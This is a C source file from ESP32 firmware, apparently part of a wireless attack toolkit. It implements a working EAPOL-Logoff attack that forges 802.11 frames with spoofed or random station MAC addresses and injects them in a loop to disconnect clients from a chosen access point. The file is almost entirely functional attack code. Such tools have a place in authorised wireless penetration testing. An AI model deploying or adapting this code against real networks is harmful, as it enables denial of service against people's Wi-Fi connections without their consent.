/**
 * @file eapol_logoff.c
 * @brief EAPOL logoff attack implementation
 * 
 * This module handles EAPOL logoff attacks which send forged EAPOL-Logoff frames
 * to disconnect stations from access points.
 * 
 * Note: This module interfaces with wifi_manager.c for shared state
 * and WiFi control functions.
 */

#include "attacks/wifi/eapol_logoff.h"
#include "managers/wifi_manager.h"
#include "managers/ap_manager.h"
#include "managers/status_display_manager.h"
#include "managers/views/terminal_screen.h"
#include "core/system_manager.h"
#include "core/glog.h"
#include "esp_wifi.h"
#include "esp_random.h"
#include "freertos/task.h"
#include "freertos/portmacro.h"
#include <stdio.h>
#include <string.h>
#include <inttypes.h>

// External globals from wifi_manager.c
extern wifi_ap_record_t selected_ap;
extern wifi_ap_record_t *scanned_aps;
extern uint16_t ap_count;
extern station_ap_pair_t station_ap_list[MAX_STATIONS];
extern int station_count;
extern bool station_selected;
extern station_ap_pair_t selected_station;

// Module state
static volatile bool eapol_logoff_running = false;
static volatile uint32_t eapol_logoff_packets_sent = 0;
static TaskHandle_t eapol_logoff_task_handle = NULL;
static uint32_t eapol_attack_delay_ms = 10;

// Template for EAPOL Logoff frame: Data frame header + LLC/SNAP + EAPOL header
static const uint8_t eapol_logoff_frame_template[36] = {
    0x08, 0x01,                   // Frame Control: Data, ToDS=1, FromDS=0
    0x00, 0x00,                   // Duration
    // addr1 (dest), addr2 (src), addr3 (bssid) placeholders
    0,0,0,0,0,0, 0,0,0,0,0,0, 0,0,0,0,0,0,
    0x00, 0x00,                   // SeqCtrl
    // LLC/SNAP
    0xAA, 0xAA, 0x03, 0x00, 0x00, 0x00, 0x88, 0x8E,
    // EAPOL header: version 1, type Logoff(2), length 0
    0x01, 0x02, 0x00, 0x00
};

static void eapol_logoff_task(void *param) {
    (void)param;
    uint8_t frame[sizeof(eapol_logoff_frame_template)];
    TickType_t last_log_tick = xTaskGetTickCount();
    uint32_t last_log_total = 0;
    while (eapol_logoff_running) {
        // Copy template
        memcpy(frame, eapol_logoff_frame_template, sizeof(frame));
        
        if (station_selected) {
            // target specific selected station
            uint8_t *ap_bssid = selected_station.ap_bssid;
            uint8_t *sta_mac = selected_station.station_mac;
            
            // set channel to ap's channel
            for (int i = 0; i < ap_count; i++) {
                if (memcmp(scanned_aps[i].bssid, ap_bssid, 6) == 0) {
                    esp_wifi_set_channel(scanned_aps[i].primary, WIFI_SECOND_CHAN_NONE);
                    break;
                }
            }
            
            memcpy(&frame[4], ap_bssid, 6);     // dest: ap
            memcpy(&frame[10], sta_mac, 6);     // src: station
            memcpy(&frame[16], ap_bssid, 6);    // bssid: ap
            
            if (esp_wifi_80211_tx(ap_manager_get_tx_iface(), frame, sizeof(frame), false) == ESP_OK) {
                eapol_logoff_packets_sent++;
            }
        } else if (strlen((const char *)selected_ap.ssid) > 0) {
            // target selected ap - send logoff for all its stations
            uint8_t *ap_bssid = selected_ap.bssid;
            
            // set channel
            esp_wifi_set_channel(selected_ap.primary, WIFI_SECOND_CHAN_NONE);
            
            // send logoff for each known station on this ap
            bool sent_any = false;
            for (int j = 0; j < station_count; j++) {
                if (memcmp(station_ap_list[j].ap_bssid, ap_bssid, 6) == 0) {
                    memcpy(&frame[4], ap_bssid, 6);                           // dest: ap
                    memcpy(&frame[10], station_ap_list[j].station_mac, 6);    // src: station
                    memcpy(&frame[16], ap_bssid, 6);                          // bssid: ap
                    
                    if (esp_wifi_80211_tx(ap_manager_get_tx_iface(), frame, sizeof(frame), false) == ESP_OK) {
                        eapol_logoff_packets_sent++;
                    }
                    sent_any = true;
                    vTaskDelay(pdMS_TO_TICKS(5));
                }
            }
            if (!sent_any) {
                // no stations found, send generic logoff with random station mac
                static uint32_t last_warning_time = 0;
                uint32_t current_time = xTaskGetTickCount();
                
                // Only print warning every 5 seconds to avoid spam
                if (current_time - last_warning_time > pdMS_TO_TICKS(5000)) {
                    glog("no stations found for this ap.\nattack more effective with discovered stations\n");
                    last_warning_time = current_time;
                }
                
                uint8_t fake_sta[6];
                esp_fill_random(fake_sta, 6);
                fake_sta[0] &= 0xFE; fake_sta[0] |= 0x02;
                
                memcpy(&frame[4], ap_bssid, 6);     // dest: ap
                memcpy(&frame[10], fake_sta, 6);    // src: fake station
                memcpy(&frame[16], ap_bssid, 6);    // bssid: ap
                
                if (esp_wifi_80211_tx(ap_manager_get_tx_iface(), frame, sizeof(frame), false) == ESP_OK) {
                    eapol_logoff_packets_sent++;
                }
            }
        } else {
            // no target selected, signal stop and exit
            glog("no ap or station selected for eapol logoff\n");
            eapol_logoff_running = false;
            break;
        }

        TickType_t now = xTaskGetTickCount();
        if ((now - last_log_tick) >= pdMS_TO_TICKS(5000)) {
            uint32_t total = eapol_logoff_packets_sent;
            uint32_t interval = total - last_log_total;
            last_log_total = total;
            last_log_tick = now;
            uint32_t pps = interval / 5;
            glog("EAPOL-Logoff: %lu/sec | Total: %lu\n", (unsigned long)pps, (unsigned long)total);
        }
        
        vTaskDelay(pdMS_TO_TICKS(eapol_attack_delay_ms));
    }
    eapol_logoff_task_handle = NULL;
    vTaskDeleteWithCaps(NULL);
}

void eapol_logoff_start(void) {
    if (eapol_logoff_running) {
        glog("EAPOL Logoff already running\n");
        return;
    }
    
    // Validate target before starting
    if (!station_selected && strlen((const char *)selected_ap.ssid) == 0) {
        glog("EAPOL Logoff: No AP or station selected. Use 'select -a <index>' first.\n");
        return;
    }
    
    // Set the attack radio profile here (as deauth/channel-switch do) instead
    // of relying on the WiFi manager having booted in APSTA — it now runs
    // STA-only when the SoftAP is disabled in settings, so an ambient radio
    // isn't guaranteed. The profile tears down the GhostNet AP (kicking any
    // WebUI client) and injects from the STA interface.
    ap_manager_stop_services();
    esp_wifi_stop();
    vTaskDelay(pdMS_TO_TICKS(50));

    ESP_ERROR_CHECK(ap_manager_apply_attack_radio());

    eapol_logoff_running = true;
    eapol_logoff_packets_sent = 0;
#ifdef CONFIG_WITH_STATUS_DISPLAY
    status_display_show_attack("EAPOL logoff", "running");
#endif
    BaseType_t attack_rc = xTaskCreate_psram(eapol_logoff_task, "eapol_logoff", 2048, NULL, 5, &eapol_logoff_task_handle);
    if (attack_rc != pdPASS) {
        glog("EAPOL Logoff failed to start (attack=%ld)\n", (long)attack_rc);
        eapol_logoff_running = false;
        if (eapol_logoff_task_handle) {
            vTaskDeleteWithCaps(eapol_logoff_task_handle);
            eapol_logoff_task_handle = NULL;
        }
        esp_wifi_stop();
        (void)ap_manager_restore_after_attack("eapol logoff start");
#ifdef CONFIG_WITH_STATUS_DISPLAY
        status_display_show_status("EAPOL start failed");
#endif
        return;
    }
}

void eapol_logoff_stop(void) {
    if (!eapol_logoff_running && eapol_logoff_task_handle == NULL) {
        return;
    }

    // Signal tasks to stop gracefully
    eapol_logoff_running = false;
    
    // Wait for tasks to finish gracefully before force deletion
    int wait_count = 0;
    while (eapol_logoff_task_handle != NULL && wait_count < 100) {
        vTaskDelay(pdMS_TO_TICKS(10));
        wait_count++;
    }
    
    // Delete attack task if still exists
    if (eapol_logoff_task_handle) {
        TaskHandle_t temp_handle = eapol_logoff_task_handle;
        eapol_logoff_task_handle = NULL;
        vTaskDeleteWithCaps(temp_handle);
    }
    
    esp_wifi_stop();
    (void)ap_manager_restore_after_attack("eapol logoff stop");
    
    glog("EAPOL-Logoff stopped. Total: %lu packets\n", (unsigned long)eapol_logoff_packets_sent);
#ifdef CONFIG_WITH_STATUS_DISPLAY
    status_display_show_status("EAPOL stopped");
#endif
}

void eapol_logoff_display(void) {
    glog("EAPOL-Logoff: Total: %lu packets\n", (unsigned long)eapol_logoff_packets_sent);
}

void eapol_logoff_help(void) {
    glog("Usage: attack -e (for EAPOL logoff attack)\n");
}

bool eapol_logoff_is_running(void) {
    return eapol_logoff_running;
}
